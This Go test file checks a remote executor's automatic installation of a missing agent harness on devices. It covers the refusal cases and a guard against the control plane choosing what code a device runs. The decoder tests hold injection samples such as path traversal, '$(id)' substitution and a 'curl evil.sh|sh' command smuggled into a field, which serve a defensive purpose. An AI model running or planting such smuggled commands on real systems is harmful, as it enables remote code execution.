package remote_test

// Tests for automatic harness installation (Task 20336).
//
// Task 20332 turned "exec: claude: executable file not found in $PATH", five
// minutes and one leased GitHub credential into a dispatch refusal. This is the
// step after it: for the ordinary case — a freshly enrolled device that has
// simply never had the harness put on it — the right answer is not a better
// error message, it is to install the thing.
//
// So what these tests hold is the boundary between the two. Install when it can
// help; keep the Task 20332 refusal, word for word, when it cannot. The cases
// that must still refuse are the ones where an operator genuinely has to go and
// do something: an agent too old to be asked, a site that turned the feature
// off, and an install that was tried and failed.

import (
	"context"
	"encoding/json"
	"errors"
	"reflect"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/blechschmidt/cloop/pkg/executor"
	"github.com/blechschmidt/cloop/pkg/executor/remote"
)

// TestInstallHarnessPayloadHasNoRemoteCodeExecutionFields is the gate on the
// security argument in installproto.go, and the sibling of the upgrade frame's
// own test.
//
// This frame ends with a device running a shell script. It is safe to expose
// only because the hub cannot say *which* script: it names a harness, and the
// device turns that into a URL through a table compiled into the agent. A field
// carrying a URL, a script body, an argv or an interpreter would each undo that
// alone — and each is the kind of thing added in good faith, a URL looking like
// a way to support an internal mirror. So the prohibition is enforced here
// rather than left to the comment.
func TestInstallHarnessPayloadHasNoRemoteCodeExecutionFields(t *testing.T) {
	banned := []string{
		"url", "uri", "source", "script", "command", "argv", "args", "exec",
		"shell", "interpreter", "env", "download", "mirror", "path", "binary",
		"skipverify", "insecure", "noverify", "checksum", "signature",
	}

	typ := reflect.TypeOf(remote.InstallHarnessPayload{})
	for i := 0; i < typ.NumField(); i++ {
		f := typ.Field(i)
		name := strings.ToLower(f.Name)
		tag := strings.ToLower(strings.Split(f.Tag.Get("json"), ",")[0])
		for _, b := range banned {
			if strings.Contains(name, b) || (tag != "" && strings.Contains(tag, b)) {
				t.Fatalf(
					"%s.%s (json %q) looks like it lets the control plane choose what a device "+
						"runs.\n\nThe install frame is a remote code execution primitive and is "+
						"only safe because it names a *harness* and nothing else: the device "+
						"resolves that to an official installer from a table compiled into it. "+
						"If this field is genuinely needed, the security argument at the top of "+
						"installproto.go has to change first.",
					typ.Name(), f.Name, tag)
			}
		}
	}
}

// TestDecodeInstallHarnessRejectsNamesThatAreNotBareTokens pins the defence in
// depth around the one field the frame does carry.
//
// A registry lookup already makes an unknown name harmless. This rejects the
// shapes that should never appear at all, because their arrival means something
// upstream has started composing the field out of user input — and the moment
// to notice that is before a later change gives it somewhere dangerous to land.
func TestDecodeInstallHarnessRejectsNamesThatAreNotBareTokens(t *testing.T) {
	for _, tc := range []struct{ name, body string }{
		{"absent", `{}`},
		{"empty", `{"harness":""}`},
		{"blank", `{"harness":"   "}`},
		{"path", `{"harness":"../../bin/sh"}`},
		{"absolute", `{"harness":"/bin/sh"}`},
		{"substitution", `{"harness":"claude$(id)"}`},
		{"separator", `{"harness":"claude;curl evil.sh|sh"}`},
		{"space", `{"harness":"claude --dangerous"}`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := remote.Frame{
				V:       remote.ProtocolVersion,
				Type:    remote.TypeInstallHarness,
				Payload: json.RawMessage(tc.body),
			}
			if _, err := remote.DecodeInstallHarness(f); !errors.Is(err, remote.ErrProtocol) {
				t.Fatalf("DecodeInstallHarness(%s) error = %v, want ErrProtocol", tc.body, err)
			}
		})
	}
}

// TestDecodeInstallHarnessAcceptsARealName is the other half: the guard above
// must not have been tightened into rejecting the names this frame exists for.
func TestDecodeInstallHarnessAcceptsARealName(t *testing.T) {
	f := remote.Frame{
		V:       remote.ProtocolVersion,
		Type:    remote.TypeInstallHarness,
		Payload: json.RawMessage(`{"harness":" claude ","reason":"a task needs it"}`),
	}
	p, err := remote.DecodeInstallHarness(f)
	if err != nil {
		t.Fatalf("DecodeInstallHarness: %v", err)
	}
	if p.Harness != "claude" {
		t.Errorf("Harness = %q, want %q (surrounding space trimmed)", p.Harness, "claude")
	}
}

// installerPeer answers install frames on the agent's behalf, recording what it
// was asked for.
type installerPeer struct {
	mu      sync.Mutex
	asked   []string
	reply   remote.HarnessInstalledPayload
	stopped chan struct{}
}

// serve answers every install frame with the configured outcome until the
// connection closes. It runs for the life of the test rather than answering
// once, because a dispatch may ask more than once and a peer that stopped after
// the first would turn a bug into a timeout instead of a failed assertion.
func (ip *installerPeer) serve(t *testing.T, p *peer) {
	t.Helper()
	ip.stopped = make(chan struct{})
	go func() {
		defer close(ip.stopped)
		for {
			f, err := p.conn.ReadFrame(context.Background())
			if err != nil {
				return
			}
			if f.Type != remote.TypeInstallHarness {
				continue
			}
			req, err := remote.DecodeInstallHarness(f)
			if err != nil {
				return
			}
			ip.mu.Lock()
			ip.asked = append(ip.asked, req.Harness)
			ip.mu.Unlock()

			out, err := remote.NewFrame(remote.TypeHarnessInstalled, f.ID, "", ip.reply)
			if err != nil {
				return
			}
			if err := p.conn.WriteFrame(context.Background(), out); err != nil {
				return
			}
		}
	}()
}

func (ip *installerPeer) askedFor() []string {
	ip.mu.Lock()
	defer ip.mu.Unlock()
	return append([]string(nil), ip.asked...)
}

// installExecutor is sandboxExecutor with the auto-install policy made explicit.
func installExecutor(t *testing.T, autoInstall bool) *remote.Executor {
	t.Helper()
	ex, err := remote.NewExecutor(remote.Options{
		ID: "agent-1", Name: "edge-1",
		Sandbox: func() (executor.SandboxSettings, error) {
			return executor.SandboxSettings{Mode: executor.SandboxModeHost}, nil
		},
		AutoInstallHarness: func() bool { return autoInstall },
	})
	if err != nil {
		t.Fatalf("NewExecutor: %v", err)
	}
	return ex
}

// TestMissingHarnessIsInstalledThenTheDispatchProceeds is the feature.
//
// The device advertises `cloop` and nothing else — the sgx agent's actual
// inventory, and the configuration that produced Task 20332 — and the project
// drives `claude`. Before this the dispatch was refused. Now the hub asks, the
// device installs, and the same dispatch carries on past the harness gate.
func TestMissingHarnessIsInstalledThenTheDispatchProceeds(t *testing.T) {
	ex := installExecutor(t, true)
	p, sess := connect(t, ex, remote.AgentRecord{AgentID: "agent-1", Name: "edge-1"},
		helloWithHarnesses(remote.MinHarnessInstallVersion, "cloop"), nil)
	defer sess.Close()

	ip := &installerPeer{reply: remote.HarnessInstalledPayload{
		Installed: true, Harness: "claude",
		Path: "/root/.local/bin/claude", Version: "2.1.211 (Claude Code)",
	}}
	ip.serve(t, p)

	// Nothing answers the start frame that follows, so this is bounded: the
	// assertion is about a gate that has already decided by the time the frame
	// goes out. What must not happen is ErrHarnessUnavailable.
	_, err := ex.Start(briefly(t), claudeSpec(t.TempDir()))
	if errors.Is(err, remote.ErrHarnessUnavailable) {
		t.Fatalf("dispatch was refused for a harness the device installed on request: %v", err)
	}

	if got := ip.askedFor(); len(got) != 1 || got[0] != "claude" {
		t.Fatalf("device was asked to install %v, want exactly [claude]", got)
	}

	// The install has to take effect on this hub *now*, not at the device's
	// next reconnect. Otherwise every dispatch in the window between would
	// reinstall a harness the device already has.
	if !hasHarness(ex.AgentCapabilities().Harnesses, "claude") {
		t.Errorf("advertised harnesses = %v, want claude recorded after a successful install",
			ex.AgentCapabilities().Harnesses)
	}
}

// TestASecondDispatchDoesNotReinstall is the consequence of the last assertion
// above, stated as the behaviour an operator would notice: a device that has
// just installed a harness is not asked again on the next task.
func TestASecondDispatchDoesNotReinstall(t *testing.T) {
	ex := installExecutor(t, true)
	p, sess := connect(t, ex, remote.AgentRecord{AgentID: "agent-1", Name: "edge-1"},
		helloWithHarnesses(remote.MinHarnessInstallVersion, "cloop"), nil)
	defer sess.Close()

	ip := &installerPeer{reply: remote.HarnessInstalledPayload{Installed: true, Harness: "claude"}}
	ip.serve(t, p)

	for i := 0; i < 2; i++ {
		_, _ = ex.Start(briefly(t), claudeSpec(t.TempDir()))
	}
	if got := ip.askedFor(); len(got) != 1 {
		t.Errorf("device was asked to install %d times, want 1: %v", len(got), got)
	}
}

// TestAFailedInstallRefusesAndSaysWhy keeps the Task 20332 remedies and adds
// the account of the attempt.
//
// Both halves matter. Without the device's reason the operator cannot tell a
// missing bash from a missing network; without the manual remedies the message
// would be a diagnosis with no next step, which is what this whole line of work
// has been trying to stop producing.
func TestAFailedInstallRefusesAndSaysWhy(t *testing.T) {
	ex := installExecutor(t, true)
	p, sess := connect(t, ex, remote.AgentRecord{AgentID: "agent-1", Name: "edge-1"},
		helloWithHarnesses(remote.MinHarnessInstallVersion, "cloop"), nil)
	defer sess.Close()

	ip := &installerPeer{reply: remote.HarnessInstalledPayload{
		Installed: false, Harness: "claude",
		Reason: "the installer is a bash script and this device has no bash on PATH",
	}}
	ip.serve(t, p)

	_, err := ex.Start(context.Background(), claudeSpec(t.TempDir()))
	if !errors.Is(err, remote.ErrHarnessUnavailable) {
		t.Fatalf("Start error = %v, want ErrHarnessUnavailable", err)
	}
	for _, want := range []string{
		"edge-1", "claude", "cloop", // which device, which binary, what it has
		"no bash on PATH",                            // why the automatic path did not help
		"container sandbox", remote.HarnessImageHint, // the manual ways out
	} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("diagnostic should mention %q; got %q", want, err)
		}
	}
}

// TestAutoInstallCanBeTurnedOff is the enterprise escape hatch.
//
// A site running cloop on critical hosts may not want a vendor script fetched
// and run there on the control plane's say-so. Turning the policy off has to
// mean no frame is sent at all — not merely that a failure is tolerated — and
// the operator gets the Task 20332 refusal unchanged.
func TestAutoInstallCanBeTurnedOff(t *testing.T) {
	ex := installExecutor(t, false)
	p, sess := connect(t, ex, remote.AgentRecord{AgentID: "agent-1", Name: "edge-1"},
		helloWithHarnesses(remote.MinHarnessInstallVersion, "cloop"), nil)
	defer sess.Close()

	ip := &installerPeer{reply: remote.HarnessInstalledPayload{Installed: true}}
	ip.serve(t, p)

	_, err := ex.Start(context.Background(), claudeSpec(t.TempDir()))
	if !errors.Is(err, remote.ErrHarnessUnavailable) {
		t.Fatalf("Start error = %v, want ErrHarnessUnavailable", err)
	}
	if got := ip.askedFor(); len(got) != 0 {
		t.Errorf("device was asked to install %v with auto-install disabled", got)
	}
	// The refusal must be the plain one: claiming an install failed when the
	// policy forbade attempting it would send an operator to debug a device
	// that is behaving exactly as configured.
	if strings.Contains(err.Error(), "did not work") {
		t.Errorf("refusal should not claim a failed install attempt; got %q", err)
	}
}

// TestAnAgentTooOldToInstallGetsThePlainRefusal covers the softest version gate
// in the protocol.
//
// A pre-v12 agent does not know the frame. Asking anyway would earn a protocol
// error, and reporting *that* would bury the operator's actual problem — a
// missing harness — under a complaint about a version number they did not ask
// about. So the hub skips the attempt silently and refuses as it did before.
func TestAnAgentTooOldToInstallGetsThePlainRefusal(t *testing.T) {
	ex := installExecutor(t, true)
	p, sess := connect(t, ex, remote.AgentRecord{AgentID: "agent-1", Name: "edge-1"},
		helloWithHarnesses(remote.MinHarnessInstallVersion-1, "cloop"), nil)
	defer sess.Close()

	ip := &installerPeer{reply: remote.HarnessInstalledPayload{Installed: true}}
	ip.serve(t, p)

	_, err := ex.Start(context.Background(), claudeSpec(t.TempDir()))
	if !errors.Is(err, remote.ErrHarnessUnavailable) {
		t.Fatalf("Start error = %v, want ErrHarnessUnavailable", err)
	}
	if got := ip.askedFor(); len(got) != 0 {
		t.Errorf("a pre-v%d agent was sent an install frame: %v", remote.MinHarnessInstallVersion, got)
	}
	for _, unwanted := range []string{"did not work", "protocol"} {
		if strings.Contains(err.Error(), unwanted) {
			t.Errorf("refusal should not mention %q; got %q", unwanted, err)
		}
	}
}

// TestContainerModeNeverInstalls holds the one silence that is about the
// boundary rather than the binary.
//
// In container mode the harness comes out of the image, which is precisely the
// configuration that *fixes* a device with no claude on it. Installing onto the
// device's host there would do nothing for the payload and would leave a vendor
// binary on a machine whose whole configuration says workloads do not run on it.
func TestContainerModeNeverInstalls(t *testing.T) {
	ex, err := remote.NewExecutor(remote.Options{
		ID: "agent-1", Name: "edge-1",
		Sandbox: func() (executor.SandboxSettings, error) {
			return executor.SandboxSettings{
				Mode: executor.SandboxModeContainer, Image: "example.invalid/img:1",
			}, nil
		},
		AutoInstallHarness: func() bool { return true },
	})
	if err != nil {
		t.Fatalf("NewExecutor: %v", err)
	}
	p, sess := connect(t, ex, remote.AgentRecord{AgentID: "agent-1", Name: "edge-1"},
		helloWithHarnesses(remote.MinHarnessInstallVersion, "cloop"), nil)
	defer sess.Close()

	ip := &installerPeer{reply: remote.HarnessInstalledPayload{Installed: true}}
	ip.serve(t, p)

	_, _ = ex.Start(briefly(t), claudeSpec(t.TempDir()))
	if got := ip.askedFor(); len(got) != 0 {
		t.Errorf("a container-mode dispatch asked the device's host to install %v", got)
	}
}

// TestInstallOutcomeSummaryDistinguishesItsThreeCases pins the strings an
// operator reads, because "installed", "already had it" and "could not" are
// three different facts and a shared phrasing would collapse them.
func TestInstallOutcomeSummaryDistinguishesItsThreeCases(t *testing.T) {
	for _, tc := range []struct {
		name string
		out  remote.HarnessInstallOutcome
		want string
	}{
		{
			name: "installed",
			out: remote.HarnessInstallOutcome{
				Installed: true, Harness: "claude", Path: "/root/.local/bin/claude",
			},
			want: "/root/.local/bin/claude",
		},
		{
			name: "already present",
			out: remote.HarnessInstallOutcome{
				Installed: true, AlreadyPresent: true, Harness: "claude",
			},
			want: "already had",
		},
		{
			name: "failed without a reason",
			out:  remote.HarnessInstallOutcome{Harness: "claude"},
			want: "without giving a reason",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := tc.out.Summary("edge-1")
			if !strings.Contains(got, tc.want) || !strings.Contains(got, "edge-1") {
				t.Errorf("Summary = %q, want it to name edge-1 and contain %q", got, tc.want)
			}
		})
	}
}

// TestRequestHarnessInstallOnAnOfflineDeviceIsUnreachable covers the path the
// dispatch gate reads as "no attempt was made" rather than "the install
// failed". Getting that wrong would produce a refusal blaming an install for a
// device that was simply not connected.
func TestRequestHarnessInstallOnAnOfflineDeviceIsUnreachable(t *testing.T) {
	ex := installExecutor(t, true)
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	_, err := ex.RequestHarnessInstall(ctx, "claude", "test")
	if !errors.Is(err, remote.ErrAgentUnreachable) {
		t.Fatalf("RequestHarnessInstall error = %v, want ErrAgentUnreachable", err)
	}
}

// hasHarness is the test's own inventory check, kept local so it cannot drift
// into being the same helper the code under test uses.
func hasHarness(advertised []string, want string) bool {
	for _, h := range advertised {
		if strings.EqualFold(h, want) {
			return true
		}
	}
	return false
}
